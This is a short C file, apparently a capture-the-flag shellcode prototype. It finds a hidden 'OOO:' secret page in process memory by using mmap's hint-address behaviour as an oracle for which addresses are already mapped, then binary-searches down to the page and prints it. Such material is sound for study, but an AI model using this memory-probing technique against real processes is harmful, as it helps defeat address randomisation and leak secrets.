#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <limits.h>
#include <errno.h>

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL
#define MAX_SIZE   0x4000000

long long search(long long left, long long right) {
    long long length = right - left;
    void *p = mmap((void *)left, length, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    long long ret = 0;
    if (p == MAP_FAILED) {
        return 0;
    }
    munmap(p, length);
    if (p != (void *)left) {
        if (length == 0x1000) {
            if (strncmp((char *)left, "OOO:", 4) == 0) {
                puts((char *)left);
                ret = left;
            } else {
                ret = 0;
            }
        } else {
            ret |= search(left, (left + right) / 2);
            ret |= search((left + right) / 2, right);
        }
    }
    return ret;
}

void *shellcode()
{
    // 1. Find the secret in memory (starts with "OOO:")
    // 2. Print it
    // 3. ...
    // 4. PROFIT!

    printf("Hi! Soon I'll be your shellcode!\n");
    long long ret = 0;
    for (long long addr = ADDR_MIN; addr < 2 * ADDR_MIN; addr += MAX_SIZE) {
        void *p = mmap(addr, MAX_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (p == MAP_FAILED) {
            continue;
        }
        munmap(p, MAX_SIZE);
        if (p != addr) {
            ret |= search(addr, (2 * addr + MAX_SIZE) / 2);
            ret |= search((2 * addr + MAX_SIZE) / 2, addr + MAX_SIZE);
        }
    }

    return ret;
}
